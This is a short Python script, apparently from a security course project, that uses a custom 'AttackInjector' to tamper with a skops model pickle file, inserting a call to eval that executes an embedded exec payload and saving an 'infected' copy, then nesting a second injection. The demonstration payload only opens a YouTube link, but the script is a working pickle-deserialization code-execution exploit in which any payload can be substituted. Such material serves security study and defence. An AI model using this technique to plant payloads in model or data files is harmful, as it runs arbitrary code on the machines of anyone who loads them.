import pickle
import builtins
from extract_pickle import PickleEC
from code_injection.attackinjector import AttackInjector

# First, we instantiate our pickle extractor and attack injector
pk_extractor = PickleEC()
attack_injector =  AttackInjector(pk_extractor)

# Next, we define attack(s) we want to carry out
bad_module_name = "__builtin__"
bad_qualname = "eval"
payload = '''import webbrowser
webbrowser.open("https://www.youtube.com/watch?v=gDjMZvYWUdo")
import sys
del sys.modules['webbrowser']
'''
payload = f"exec(\'\'\'{payload}\'\'\')"

attacks = [AttackInjector.sequential_module_attack_with_memo_proto_4]
attack_indices = [20] # Indicies in original pickle file before tampering (in order pls)
attack_args = [(bad_module_name, bad_qualname, payload)]

# Injection time on binary file (Happens sequentially)
in_pickle_name = "/Users/alrivero/Documents/CSE_508/skops-eevdwgke.pkl"
out_pickle_name = "/Users/alrivero/Documents/CSE_508/skops-eevdwgke-infected.pkl"
attack_injector.inject_attacks_pickle(
    attacks,
    attack_indices,
    attack_args,
    in_pickle_name,
    out_pickle_name
)

# Now do it again to nest
attacks = [AttackInjector.sequential_module_attack_with_memo_proto_4]
attack_indices = [24] # Indicies in original pickle file before tampering (in order pls)
attack_args = [(bad_module_name, bad_qualname, payload)]
attack_injector.inject_attacks_pickle(
    attacks,
    attack_indices,
    attack_args,
    out_pickle_name,
    out_pickle_name
)